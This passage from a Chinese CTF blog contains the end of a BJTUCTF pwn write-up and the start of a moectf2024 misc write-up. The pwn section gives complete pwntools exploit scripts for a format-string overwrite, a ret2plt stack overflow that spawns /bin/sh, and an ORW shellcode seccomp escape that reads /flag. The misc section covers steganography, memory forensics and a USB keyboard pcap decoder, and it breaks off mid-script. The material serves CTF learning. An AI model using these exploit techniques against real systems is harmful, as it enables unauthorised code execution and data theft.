成为格式化字符串漏洞中泄露内存信息的常用工具。\n多搞几个%x看看：\n我试了好几次都不行，再来一次，换成AAAA更明显😔：\n终于找到了，偏移量为7，因为是小端序，两位字母为一个单位从右到左排的，所以比较难辨认，当然用BJTU也行：\n“BJTU” 对应的十六进制（按字符依次转换）为 0x42 0x4A 0x54 0x55，细心一点就能看出来了。\n这个偏移量是7为巧合？可以进行验证一下，分别用指令%7$p、%7$x：\n我们需要让Expl0rer = 6，现在又有格式化字符串漏洞，我们就可以使用其任意地址写功能将Expl0rer的值修改为6即可获得shell。\n这里使用pwntools模块中的fmtstr模块直接进行改写：\n1 fmtstr_payload(7,{daniu:6}) 完整exp：\n1 2 3 4 5 6 7 8 from pwn import * context(arch = \u0026#39;i386\u0026#39;,log_level = \u0026#39;debug\u0026#39;, os = \u0026#39;linux\u0026#39;) io = process(\u0026#39;./pwn4\u0026#39;) #io = remote(\u0026#39;ip\u0026#39;,port) Expl0rer = 0x804C060 payload = fmtstr_payload(7,{Expl0rer:6}) io.sendline(payload) io.interactive() pwn5 pwn5\n这题对于PWN入门手来说最大一个弱点是过度依赖IDA，其实这是一个缓冲区是一个动态分配，我们需要搭配pwngdb、pwndbg去调试，得出真实的缓冲区。\nchecksec：\n32位关canary、PIE保护，开NX保护。\nIDA32位分析：\nmain函数这很明显有个栈溢出漏洞，0x64+4就能覆盖。\n在汇编代码块这看到了个_system：\n全局搜索了下，没有看到/bin/sh。\n顺便搜索了system：\n接着我们需要通过gets函数手动写入/bin/sh字符串到一个可写可执行区域，通常在bss段，在ida找到一个地址。\n为什么要写入bss内存字段？直接给system函数压进一个字符串/bin/sh作为变量不就可以了吗？这我当初也这么想，其实不然：\nBSS 段的特性：BSS（Block Started by Symbol）段通常用于存储未初始化或初始化为 0 的全局变量和静态变量。它在程序加载时就已经分配好了固定的内存空间， 并且在程序的整个生命周期内，这块内存区域的地址是相对稳定的。将/bin/sh写入 BSS 段，可以保证字符串在需要使用时，其内容不会被意外修改，从而确保system函数能够正确获取到参数。\n变量有效性：不管是system、常见的printf、read这些函数都是要有参数的，不是简简单单放一个字符串就可以了，变量需要在程序中有地址，这样程序才能找到它，单一个字符串是没有意义的，因为没有分配内存地址。\nexp：\n1 2 3 4 5 6 7 8 9 10 11 12 13 from pwn import * context.log_level = \u0026#39;debug\u0026#39; io = process(\u0026#39;./pwn5\u0026#39;) #io = remote(\u0026#39;ip\u0026#39;,port) elf = ELF(\u0026#39;./pwn5\u0026#39;) sys_addr = elf.plt[\u0026#39;system\u0026#39;] gets_addr = elf.plt[\u0026#39;gets\u0026#39;] bss_addr = 0x0804A080 payload = cyclic(0x70) + p32(gets_addr) + p32(sys_addr) + p32(bss_addr) + p32(bss_addr) io.recv() io.sendline(payload) io.sendline(\u0026#39;/bin/sh\u0026#39;) io.interactive() 对于缓冲区大小，不是0x64+4吗？这里是一个坑，这里我们具体要用gdb+cyclic来分析：\n详细步骤：\n第一步先生成个200个随机字符，毕竟大部分参数容量大小不会有200这么大吧。\n复制，接着给gets或者main函数断点，再输入r（run）运行程序：\n这时候就会出现彩色的调试界面，有些人是在一个终端窗口出现的，我的是在另外一个弹出终端窗口调试界面的。\n输入n（next），一步步执行程序，直到指针指向gets函数需要我们输入字符串的时候：\n输入上次用cyclic生成的200个随机字符串。\n然后再下一步n，直到崩溃：\n出现了SIGSEGV崩溃标识，右边是我们注入的200个随机字符串的结果。\n去调试界面，看EIP状况：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 ──────────────────────────[ REGISTERS ]────────────────────────── EAX 0x0 EBX 0x0 ECX 0xf7fac5c0 (_IO_2_1_stdin_) ◂— 0xfbad2288 EDX 0xf7fad89c (_IO_stdfile_0_lock) ◂— 0x0 EDI 0x0 ESI 0xf7fac000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d7d8c EBP 0x62616163 (\u0026#39;caab\u0026#39;) ESP 0xffffcf10 ◂— \u0026#39;eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\u0026#39; EIP 0x62616164 (\u0026#39;daab\u0026#39;) ───────────────────────────[ DISASM ]──────────────────────────── Invalid address 0x62616164 ────────────────────────────[ STACK ]──────────────────────────── 00:0000│ esp 0xffffcf10 ◂— \u0026#39;eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\u0026#39; 01:0004│ 0xffffcf14 ◂— \u0026#39;faabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\u0026#39; 02:0008│ 0xffffcf18 ◂— \u0026#39;gaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\u0026#39; 03:000c│ 0xffffcf1c ◂— \u0026#39;haabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\u0026#39; 04:0010│ 0xffffcf20 ◂— \u0026#39;iaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\u0026#39; 05:0014│ 0xffffcf24 ◂— \u0026#39;jaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\u0026#39; 06:0018│ 0xffffcf28 ◂— \u0026#39;kaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\u0026#39; 07:001c│ 0xffffcf2c ◂— \u0026#39;laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\u0026#39; ──────────────────────────[ BACKTRACE ]────────────────────────── ► f 0 62616164 f 1 62616165 f 2 62616166 f 3 62616167 f 4 62616168 f 5 62616169 f 6 6261616a f 7 6261616b 在利用 cyclic 工具进行缓冲区溢出漏洞测试时，关注 EIP 寄存器中存储的字符串（实际上是特定模式的字符序列），是为了精确定位覆盖 EIP 所需的偏移量，这是漏洞利用的关键步骤。\n这时，EIP被“daab”所覆盖，这里用cyclic工具查此时的偏移量。\n1 cyclic -l \u0026#39;xxxx\u0026#39; 112的十六进制是0x70，我们程序需要覆盖的大小应该是0x70。\n对于payload：\np32(gets_addr)：gets_addr 是 gets 函数在程序 PLT（过程链接表）中的地址（整数形式）。通过 p32，将这个32 位的地址整数转换成小端字节序的 32 位二进制数据，这样当 payload 被程序接收并处理时，内存中就能正确存储 gets 函数的地址，为后续调用 gets 函数做准备。 p32(sys_addr)：sys_addr 是 system 函数在 PLT 中的地址（整数形式）。同样，p32 把这个地址转换成小端字节序的 32 位二进制数据，目的是让程序后续能正确跳转到 system 函数执行。 两个 p32(bss_addr)：bss_addr 是程序 .bss 段的一个地址（整数形式）。第一个 p32(bss_addr) 是作为 system 函数的返回地址（不过在这个利用逻辑里，更关键的是第二个 p32(bss_addr)）；第二个 p32(bss_addr) 是作为 gets 函数的参数，意思是让 gets 函数把用户输入（这里是 /bin/sh）写入到 bss_addr 对应的内存位置。之后调用 system 函数时，就会以 bss_addr 处的 /bin/sh 作为参数，执行 system(\u0026quot;/bin/sh\u0026quot;) 来获取 shell。 小结：总的来说这题对新手不算友好，但在PWN手来说算基本操作。\npwn6 pwn6\nchecksec保护信息：\nIDA 分析（依据函数功能修改对应函数名）：\n看到了陌生的mmap函数：\n1、将一个普通文件映射到内存中，通常在需要对文件进行频繁读写时使用，这样用内存读写取代 I/O 读写，以获得较高的性能；\n2、将特殊文件进行匿名内存映射，可以为关联进程提供共享内存空间；\n3、为无关联的进程提供共享内存空间，一般也是将一个普通文件映射到内存中。\n那这里的mmap函数作用就是把从 0x123000 开始的地址，大小为 0x1000 的长度，权限改为可写可执行。\n跟进seccomp函数：\nseccomp 主要用于配置和加载 Seccomp（Secure Computing Mode，安全计算模式） 策略，来限制程序可以执行的系统调用，以增强程序的安全性。\nPWN经典题目——沙箱逃逸（对立是沙盒过滤）：\n1 seccomp-tools dump ./pwn6 可以看到，只有 read，write，open，exit 可以使用，使用 open–\u0026gt;read–\u0026gt;write 这样的 orw 的方式。\nORW 指的是 Open-Read-Write 技术，是一种利用系统调用读取文件内容（如 flag 文件）的攻击方法。\nORW 通过以下三个系统调用实现：\nopen：打开目标文件，获取文件描述符。\nread：通过文件描述符读取文件内容到缓冲区。\nwrite：将缓冲区的内容写入标准输出。\n跟进BJTUCTF函数：\n看到了明显的栈溢出漏洞，在上面我提及过 mmap 函数，在 main 函数已经执行过一次了，在 0x123000 这里已经有可写可执行权限了。到这里，攻击思路就比较清晰了，我们想办法往 mmap 给的这个地址段里面写 shellcode (ORW)，然后跳转到这里执行。\n那我们的 orw_shellcode：\n1 2 3 4 5 mmap = 0x123000 orw_shellcode = shellcraft.open(\u0026#34;/flag\u0026#34;) orw_shellcode = shellcraft.read(3,mmap,0x100)## read里的fd写3是因为程序执行的时候文件描述符是从3开始的，write里的1是标准输出到显示器 orw_shellcode = shellcraft.write(1,mmap,0x100) shellcode = asm(orw_shellcode) shellcode 已经编好了，现在编 payload 让程序听我们话，将 shellcode 注入进内存中去。\nshellcraft.read 的作用是执行 read 函数的后续流程 —— 读取 0x100 长度的字符（也就是后续的 orw_shellcode），文件描述符 fd=3（0、1、2 已被标准文件占用）\nshellcraft.write(1, mmap, 0x100) 的 1 是 Linux 标准输出（stdout）的固定文件描述符，其功能是将 mmap 区域中存储的 \\flag 内容输出到屏幕，当成 printf 也行。\npayload：\n1 2 3 4 jmp_rsp = 0x400a01 payload = asm(shellcraft.read(0, mmap, 0x100)) + asm(\u0026#34;mov rax, 0x123000; jmp rax\u0026#34;) payload = payload.ljust(0x28,b\u0026#39;a\u0026#39;) payload += p64(jmp_rsp) +asm(\u0026#34;sub rsp, 0x30; jmp rsp\u0026#34;) 我在汇编代码分析的过程中找到关键的 jmp_rsp 后门地址，可以调用这行汇编代码来实现跳转回起始地址：\nayload = asm (shellcraft.read (0, mmap, 0x100)) 的意思是启动 read 函数，开启 “读取模式” 处于待读取状态，等待后面的 orw_shellcode 的出现，并存到 mmap 的可读可写区域（2+4）；\n最正确理解：执行后因缺少输入数据（orw_shellcode）才进入 “等待状态”。\nasm (“mov rax, 0x123000; jmp rax”) 的意思是跳到 mmap=0x123000 区域，也就是指向这个区域，等待后续 orw_shellcode 注入执行。\npayload = asm (shellcraft.read (0, mmap, 0x100)) + asm (“mov rax, 0x123000; jmp rax”) 加起来不足 0x28 个字节（0x20+8），让 buf 刚好充满，以便后续将 rsp 调整到 buf 缓冲区起始地址（buf 复原）。\npython3 的 exp：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 from pwn import * context(arch=\u0026#34;amd64\u0026#34;,os=\u0026#34;linux\u0026#34;,log_level=\u0026#34;debug\u0026#34;) #io = remote(\u0026#39;ip\u0026#39; , port) io = process(\u0026#39;./pwn\u0026#39;) mmap = 0x123000 jmp_rsp = 0x400a01 payload = asm(shellcraft.read(0, mmap, 0x100)) + asm(\u0026#34;mov rax, 0x123000; jmp rax\u0026#34;) payload = payload.ljust(0x28,b\u0026#39;a\u0026#39;) payload += p64(jmp_rsp) +asm(\u0026#34;sub rsp, 0x30; jmp rsp\u0026#34;) orw_shellcode = shellcraft.open(\u0026#34;/flag\u0026#34;) + shellcraft.read(3, mmap, 0x100) + shellcraft.write(1, mmap, 0x100) shellcode = asm(orw_shellcode) io.recvuntil(\u0026#39;do\u0026#39;) io.sendline(payload) io.sendline(shellcode) io.interactive() 结尾 有疑问解决不了，可以在下方评论区相互交流，作者一直都在\u0026hellip;.\n","date":"2025-11-01T00:00:00Z","headings":[{"id":"前沿概述","level":2,"text":"前沿概述\n"},{"id":"bjtuctfwp","level":2,"text":"BJTUCTF——WP\n"},{"id":"结尾","level":2,"text":"结尾\n"},{"id":"pwn1","level":3,"text":"pwn1\n"},{"id":"pwn2","level":3,"text":"pwn2\n"},{"id":"pwn3","level":3,"text":"pwn3\n"},{"id":"pwn4","level":3,"text":"pwn4\n"},{"id":"pwn5","level":3,"text":"pwn5\n"},{"id":"pwn6","level":3,"text":"pwn6\n"}],"image":"https://expl0rer.top/p/2025bjtuctf-pwn/BJTUCTF_hu_6b82d3b72b2f0a36.png","permalink":"https://expl0rer.top/p/2025bjtuctf-pwn/","title":"2025BJTUCTF-PWN"},{"content":"[TOC]\n前言：moectf2024是我入门网安CTF的第一个比赛，对我进步成长起到了至关重要的影响，今天我将我之前的WP全部整理写成这一份文章供新手食用，各位师傅感兴趣可以一起交流啊。\n有一部分因为丢失但记得是K掉的题，复现不来，在这我就会引用官方的WP。\n西电 CTF 终端\n安全杂项 杂项入门指北 打开图片仔细观察发现其中某条线是由\u0026rsquo;.\u0026lsquo;与\u0026rsquo;-\u0026lsquo;的组合，猜测为Morse Code\n解码后即为flagmoectf{H4VE_A_G00D_T1ME}\nsignin 开启环境后按照要求将luo设为缺勤，其他代签后点完成即得flag\nmoectf{Thanks_For_You_signing_in_4ND_W3l0c0me_T0_M0ecTf_2024!!!}\n罗小黑战记 题解1：stegsolve逐帧分析，找到flag相关的图片 题解2：简单的在线解码工具，去扫描二维码，（因为图片有两帧），可以捕捉到并识别 其他在线网站不予以罗列\nez_Forensics 下载附件后得到一个raw文件，但是用图片编辑器打不开，16进制也不像是raw图片，检索forensic相关可以知道这个raw 实际上为电脑内存镜像以及分析工具：volatility\n分析题目可以知道flag之前出现在cmd命令中，正好cmdscan命令可以查看cmd历史命令,使用如下命令即可得到flag\nvol.py -f /mnt/c/Users/Administrator/Downloads/flag__/flag.raw --profile=Win7SP1x64 cmdscan\nmoectf{WWBGY-TLVC5-XKYBZ}\nso many \u0026rsquo;m\u0026rsquo; 打开文本发现里面是一坨乱码，但仔细看会发现moectf{}等重要字符都出现过，故flag可能为某种排列方式，题目表示m出现的次数最多，联想到词频分析 又注意到提示 如果有某几个字符无法判断顺序请按字典序排序 对于出现次数相同的字符用字典序排序\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 from collections import Counter def frequency(file_): with open(file_, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as file: text = file.read() char_count = Counter(text) sorted_char_count = sorted(char_count.items(), key=lambda x: (-x[1], x[0])) for char, count in sorted_char_count: print(char, end=\u0026#39;\u0026#39;) file_ = \u0026#39;flag.txt\u0026#39; frequency(file_) # moectf{C0MpuTaskingD4rE}!#@bdhjlqvwxyz flag即为moectf{C0MpuTaskingD4rE}\nAbnormal lag 打开音频发现刚开始以及末尾都有一小部分声音有异常，使用音频编辑器打开查看频谱图放大两处发现 对于辨识问题 题目说了flag里只有a-f，所以不应该有那么多的辨识问题，不过还是吸取经验，下次尽量避免这种问题\nmoectf{09e3f7f8-c970-4c71-92b0-6f03a677421a}\nMisc问卷调查 填写问卷并提交即得flag moectf{thanks_for_filling_out_the_questionnaire}\nez_F5 下载图片后查看属性发现一串base32,解码为 no_password\n根据题目名称搜索f5等关键词，可以发现一个叫f5隐写的东西，甚至类似的wp也有很多，跟着做就行\n其中会遇到的问题基本集中在：\n1.没有提取出任何东西 这是因为加密的时候有密码但是解密时无密码导致的（错误密码有时也会导致）\n2.提取出了一堆乱码 这是因为密码输错导致的\n已知有密码但是他前面又给了一个no_password,所以密码就是no_password\n输入正确密码提取后得到flag moectf{F5_15_s0_lntere5t1n9}\nthe upside and down 010打开文件，选中\u0026quot;File\u0026quot;-\u0026gt;\u0026ldquo;Export HEX\u0026rdquo; 导出为txt 在note pad++ 或者 记事本中，用正则匹配进行数据处理（删除了空格和回车） 参考倒置脚本如下 再\u0026quot;File\u0026quot;-\u0026gt;\u0026ldquo;Import HEX\u0026rdquo;, 打开就是png图片了\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 def reverse_entire_file_content(input_file_path, output_file_path): with open(input_file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as infile: content = infile.read() reversed_content = content[::-1] with open(output_file_path, \u0026#39;w\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as outfile: outfile.write(reversed_content) input_file_path = r\u0026#39;输入 TXT 文件路径\u0026#39; output_file_path = \u0026#39;输出 TXT 文件路径\u0026#39; reverse_entire_file_content(input_file_path, output_file_path) 可实现的脚本很多，不予以罗列\nctfer2077① 给了一张二维码图片，直接扫获得一个b站视频bv号，不过进去发现是被骗的视频，flag还是藏在图片中\n将图片使用010或者windex打开搜索flag会得到以下内容\nwhere is the flag? OK I give you some hints:incomplete LSB\n将图片载入stegsolve中发现只有Red0通道有隐写，这也是为什么叫做不完全的lsb\n提取获得flag moectf{84d7f247-3cba-4077-ba25-079f3ac7bb8a}\nez_usbpcap 键盘流量，先拿tshark提取hid data（也可以按照如下脚本，实现一键提取） 最后用这个脚本即得（此脚本为引用后加以更改，感谢原师傅wangyihanger） 此题易错点是：拿数字键盘区输入的数字，很多常见脚本都没有对应的键值对，需要大伙自己去搜加进去,补全脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 #!/usr/bin/env python import sys import os DataFileName = \u0026#34;usb.dat\u0026#34; presses = [] normalKeys = {\u0026#34;04\u0026#34;: \u0026#34;a\u0026#34;, \u0026#34;05\u0026#34;: \u0026#34;b\u0026#34;, \u0026#34;06\u0026#34;: \u0026#34;c\u0026#34;, \u0026#34;07\u0026#34;: \u0026#34;d\u0026#34;, \u0026#34;08\u0026#34;: \u0026#34;e\u0026#34;, \u0026#34;09\u0026#34;: \u0026#34;f\u0026#34;, \u0026#34;0a\u0026#34;: \u0026#34;g\u0026#34;, \u0026#34;0b\u0026#34;: \u0026#34;h\u0026#34;, \u0026#34;0c\u0026#34;: \u0026#34;i\u0026#34;, \u0026#34;0d\u0026#34;: \u0026#34;j\u0026#34;, \u0026#34;0e\u0026#34;: \u0026#34;k\u0026#34;, \u0026#34;0f\u0026#34;: \u0026#34;l\u0026#34;, \u0026#34;10\u0026#34;: \u0026#34;m\u0026#34;, \u0026#34;11\u0026#34;: \u0026#34;n\u0026#34;, \u0026#34;12\u0026#34;: \u0026#34;o\u0026#34;, \u0026#34;13\u0026#34;: \u0026#34;p\u0026#34;, \u0026#34;14\u0026#34;: \u0026#34;q\u0026#34;, \u0026#34;15\u0026#34;: \u0026#34;r\u0026#34;, \u0026#34;16\u0026#34;: \u0026#34;s\u0026#34;, \u0026#34;17\u0026#34;: \u0026#34;t\u0026#34;, \u0026#34;18\u0026#34;: \u0026#34;u\u0026#34;, \u0026#34;19\u0026#34;: \u0026#34;v\u0026#34;, \u0026#34;1a\u0026#34;: \u0026#34;w\u0026#34;, \u0026#34;1b\u0026#34;: \u0026#34;x\u0026#34;, \u0026#34;1c\u0026#34;: \u0026#34;y\u0026#34;, \u0026#34;1d\u0026#34;: \u0026#34;z\u0026#34;, \u0026#34;1e\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;1f\u0026#34;: \u0026#34;2\u0026#34;, \u0026#34;20\u0026#34;: \u0026#34;3\u0026#34;, \u0026#34;21\u0026#34;: \u0026#34;4\u0026#34;, \u0026#34;22\u0026#34;: \u0026#34;5\u0026#34;, \u0026#34;23\u0026#34;: \u0026#34;6\u0026#34;, \u0026#34;24\u0026#34;: \u0026#34;7\u0026#34;, \u0026#34;25\u0026#34;: \u0026#34;8\u0026#34;, \u0026#34;26\u0026#34;: \u0026#34;9\u0026#34;, \u0026#34;27\u0026#34;: \u0026#34;0\u0026#34;, \u0026#34;28\u0026#34;: \u0026#34;\u0026lt;RET\u0026gt;\u0026#34;, \u0026#34;29\u0026#34;: \u0026#34;\u0026lt;ESC\u0026gt;\u0026#34;, \u0026#34;2a\u0026#34;: \u0026#34;\u0026lt;DEL\u0026gt;\u0026#34;, \u0026#34;2b\u0026#34;: \u0026#34;\\t\u0026#34;, \u0026#34;2c\u0026#34;: \u0026#34;\u0026lt;SPACE\u0026gt;\u0026#34;, \u0026#34;2d\u0026#34;: \u0026#34;-\u0026#34;, \u0026#34;2e\u0026#34;: \u0026#34;=\u0026#34;, \u0026#34;2f\u0026#34;: \u0026#34;[\u0026#34;, \u0026#34;30\u0026#34;: \u0026#34;]\u0026#34;, \u0026#34;31\u0026#34;: \u0026#34;\\\\\u0026#34;, \u0026#34;32\u0026#34;: \u0026#34;\u0026lt;NON\u0026gt;\u0026#34;, \u0026#34;33\u0026#34;: \u0026#34;;\u0026#34;, \u0026#34;34\u0026#34;: \u0026#34;\u0026#39;\u0026#34;, \u0026#34;35\u0026#34;: \u0026#34;\u0026lt;GA\u0026gt;\u0026#34;, \u0026#34;36\u0026#34;: \u0026#34;,\u0026#34;, \u0026#34;37\u0026#34;: \u0026#34;.\u0026#34;, \u0026#34;38\u0026#34;: \u0026#34;/\u0026#34;, \u0026#34;39\u0026#34;: \u0026#34;\u0026lt;CAP\u0026gt;\u0026#34;, \u0026#34;3a\u0026#34;: \u0026#34;\u0026lt;F1\u0026gt;\u0026#34;, \u0026#34;3b\u0026#34;: \u0026#34;\u0026lt;F2\u0026gt;\u0026#34;, \u0026#34;3c\u0026#34;: \u0026#34;\u0026lt;F3\u0026gt;\u0026#34;, \u0026#34;3d\u0026#34;: \u0026#34;\u0026lt;F4\u0026gt;\u0026#34;, \u0026#34;3e\u0026#34;: \u0026#34;\u0026lt;F5\u0026gt;\u0026#34;, \u0026#34;3f\u0026#34;: \u0026#34;\u0026lt;F6\u0026gt;\u0026#34;, \u0026#34;40\u0026#34;: \u0026#34;\u0026lt;F7\u0026gt;\u0026#34;, \u0026#34;41\u0026#34;: \u0026#34;\u0026lt;F8\u0026gt;\u0026#34;, \u0026#34;42\u0026#34;: \u0026#34;\u0026lt;F9\u0026gt;\u0026#34;, \u0026#34;43\u0026#34;: \u0026#34;\u0026lt;F10\u0026gt;\u0026#34;, \u0026#34;44\u0026#34;: \u0026#34;\u0026lt;F11\u0026gt;\u0026#34;, \u0026#34;45\u0026#34;: \u0026#34;\u0026lt;F12\u0026gt;\u0026#34;, \u0026#34;54\u0026#34;: \u0026#34;/\u0026#34;, \u0026#34;55\u0026#34;: \u0026#34;*\u0026#34;, \u0026#34;56\u0026#34;: \u0026#34;-\u0026#34;, \u0026#34;57\u0026#34;: \u0026#34;+\u0026#34;, \u0026#34;59\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;5a\u0026#34;: \u0026#34;2\u0026#34;, \u0026#34;5b\u0026#34;: \u0026#34;3\u0026#34;, \u0026#34;5c\u0026#34;: \u0026#34;4\u0026#34;, \u0026#34;5d\u0026#34;: \u0026#34;5\u0026#34;, \u0026#34;5e\u0026#34;: \u0026#34;6\u0026#34;, \u0026#34;5f\u0026#34;: \u0026#34;7\u0026#34;, \u0026#34;60\u0026#34;: \u0026#34;8\u0026#34;, \u0026#34;61\u0026#34;: \u0026#34;9\u0026#34;, \u0026#34;62\u0026#34;: \u0026#34;0\u0026#34;, \u0026#34;63\u0026#34;: \u0026#34;.\u0026#34;, \u0026#34;67\u0026#34;: \u0026#34;=\u0026#34;} shiftKeys = {\u0026#34;04\u0026#34;: \u0026#34;A\u0026#34;, \u0026#34;05\u0026#34;: \u0026#34;B\u0026#34;, \u0026#34;06\u0026#34;: \u0026#34;C\u0026#34;, \u0026#34;07\u0026#34;: \u0026#34;D\u0026#34;, \u0026#34;08\u0026#34;: \u0026#34;E\u0026#34;, \u0026#34;09\u0026#34;: \u0026#34;F\u0026#34;, \u0026#34;0a\u0026#34;: \u0026#34;G\u0026#34;, \u0026#34;0b\u0026#34;: \u0026#34;H\u0026#34;, \u0026#34;0c\u0026#34;: \u0026#34;I\u0026#34;, \u0026#34;0d\u0026#34;: \u0026#34;J\u0026#34;, \u0026#34;0e\u0026#34;: \u0026#34;K\u0026#34;, \u0026#34;0f\u0026#34;: \u0026#34;L\u0026#34;, \u0026#34;10\u0026#34;: \u0026#34;M\u0026#34;, \u0026#34;11\u0026#34;: \u0026#34;N\u0026#34;, \u0026#34;12\u0026#34;: \u0026#34;O\u0026#34;, \u0026#34;13\u0026#34;: \u0026#34;P\u0026#34;, \u0026#34;14\u0026#34;: \u0026#34;Q\u0026#34;, \u0026#34;15\u0026#34;: \u0026#34;R\u0026#34;, \u0026#34;16\u0026#34;: \u0026#34;S\u0026#34;, \u0026#34;17\u0026#34;: \u0026#34;T\u0026#34;, \u0026#34;18\u0026#34;: \u0026#34;U\u0026#34;, \u0026#34;19\u0026#34;: \u0026#34;V\u0026#34;, \u0026#34;1a\u0026#34;: \u0026#34;W\u0026#34;, \u0026#34;1b\u0026#34;: \u0026#34;X\u0026#34;, \u0026#34;1c\u0026#34;: \u0026#34;Y\u0026#34;, \u0026#34;1d\u0026#34;: \u0026#34;Z\u0026#34;, \u0026#34;1e\u0026#34;: \u0026#34;!\u0026#34;, \u0026#34;1f\u0026#34;: \u0026#34;@\u0026#34;, \u0026#34;20\u0026#34;: \u0026#34;#\u0026#34;, \u0026#34;21\u0026#34;: \u0026#34;$\u0026#34;, \u0026#34;22\u0026#34;: \u0026#34;%\u0026#34;, \u0026#34;23\u0026#34;: \u0026#34;^\u0026#34;, \u0026#34;24\u0026#34;: \u0026#34;\u0026amp;\u0026#34;, \u0026#34;25\u0026#34;: \u0026#34;*\u0026#34;, \u0026#34;26\u0026#34;: \u0026#34;(\u0026#34;, \u0026#34;27\u0026#34;: \u0026#34;)\u0026#34;, \u0026#34;28\u0026#34;: \u0026#34;\u0026lt;RET\u0026gt;\u0026#34;, \u0026#34;29\u0026#34;: \u0026#34;\u0026lt;ESC\u0026gt;\u0026#34;, \u0026#34;2a\u0026#34;: \u0026#34;\u0026lt;DEL\u0026gt;\u0026#34;, \u0026#34;2b\u0026#34;: \u0026#34;\\t\u0026#34;, \u0026#34;2c\u0026#34;: \u0026#34;\u0026lt;SPACE\u0026gt;\u0026#34;, \u0026#34;2d\u0026#34;: \u0026#34;_\u0026#34;, \u0026#34;2e\u0026#34;: \u0026#34;+\u0026#34;, \u0026#34;2f\u0026#34;: \u0026#34;{\u0026#34;, \u0026#34;30\u0026#34;: \u0026#34;}\u0026#34;, \u0026#34;31\u0026#34;: \u0026#34;|\u0026#34;, \u0026#34;32\u0026#34;: \u0026#34;\u0026lt;NON\u0026gt;\u0026#34;, \u0026#34;33\u0026#34;: \u0026#34;:\u0026#34;, \u0026#34;34\u0026#34;: \u0026#34;\\\u0026#34;\u0026#34;, \u0026#34;35\u0026#34;: \u0026#34;\u0026lt;GA\u0026gt;\u0026#34;, \u0026#34;36\u0026#34;: \u0026#34;\u0026lt;\u0026#34;, \u0026#34;37\u0026#34;: \u0026#34;\u0026gt;\u0026#34;, \u0026#34;38\u0026#34;: \u0026#34;?\u0026#34;, \u0026#34;39\u0026#34;: \u0026#34;\u0026lt;CAP\u0026gt;\u0026#34;, \u0026#34;3a\u0026#34;: \u0026#34;\u0026lt;F1\u0026gt;\u0026#34;, \u0026#34;3b\u0026#34;: \u0026#34;\u0026lt;F2\u0026gt;\u0026#34;, \u0026#34;3c\u0026#34;: \u0026#34;\u0026lt;F3\u0026gt;\u0026#34;, \u0026#34;3d\u0026#34;: \u0026#34;\u0026lt;F4\u0026gt;\u0026#34;, \u0026#34;3e\u0026#34;: \u0026#34;\u0026lt;F5\u0026gt;\u0026#34;, \u0026#34;3f\u0026#34;: \u0026#34;\u0026lt;F6\u0026gt;\u0026#34;, \u0026#34;40\u0026#34;: \u0026#34;\u0026lt;F7\u0026gt;\u0026#34;, \u0026#34;41\u0026#34;: \u0026#34;\u0026lt;F8\u0026gt;\u0026#34;, \u0026#34;42\u0026#34;: \u0026#34;\u0026lt;F9\u0026gt;\u0026#34;, \u0026#34;43\u0026#34;: \u0026#34;\u0026lt;F10\u0026gt;\u0026#34;, \u0026#34;44\u0026#34;: \u0026#34;\u0026lt;F11\u0026gt;\u0026#34;, \u0026#34;45\u0026#34;: \u0026#34;\u0026lt;F12\u0026gt;\u0026#34;} def main(): # check argv if len(sys.argv) != 2: print(\u0026#34;Usage : \u0026#34;) print(\u0026#34; python UsbKeyboardHacker.py data.pcap\u0026#34;) print(\u0026#34;Tips : \u0026#34;) print(\u0026#34; To use this python script , you must install the tshark first.\u0026#34;) print(\u0026#34; You can use `sudo apt-get install tshark` to install it\u0026#34;) print(\u0026#34;Author : \u0026#34;) print(\u0026#34; WangYihang \u0026lt;wangyihanger@gmail.com\u0026gt;\u0026#34;) print(\u0026#34; If you have any questions , please contact me by email.\u0026#34;) print(\u0026#34; Thank you for using.\u0026#34;) exit(1) # get argv pcapFilePath = sys.argv[1] # get data of pcap os.system(\u0026#34;tshark -r %s -T fields -e usbhid.data \u0026gt; %s \u0026#34; % (pcapFilePath, DataFileName)) #此段\u0026#39;usbhid.data需要根据题目更改\u0026#39; # read data with open(DataFileName, \u0026#34;r\u0026#34;) as f: for line in f: presses.append(line[0:-1]) # handle result = \u0026#34;\u0026#34; for press in presses: if press == \u0026#39;\u0026#39; or len(press) !=16 : continue if \u0026#39;:\u0026#39; in press: Bytes = press.split(\u0026#34;:\u0026#34;) else: Bytes = [press[i:i + 2] for i in range(0, len(press), 2)] # 标志位以及数据位也要根据题目更改 if Bytes[0] == \u0026#34;00\u0026#34;: if Bytes[2] != \u0026#34;00\u0026#34; and normalKeys.get(Bytes[2]): result += normalKeys[Bytes[2]] elif int(Bytes[0], 16) \u0026amp; 0b10 or int(Bytes[0], 16) \u0026amp; 0b100000: # shift key is pressed. if Bytes[2] != \u0026#34;00\u0026#34; and normalKeys.get(Bytes[2]): result += shiftKeys[Bytes[2]] else: 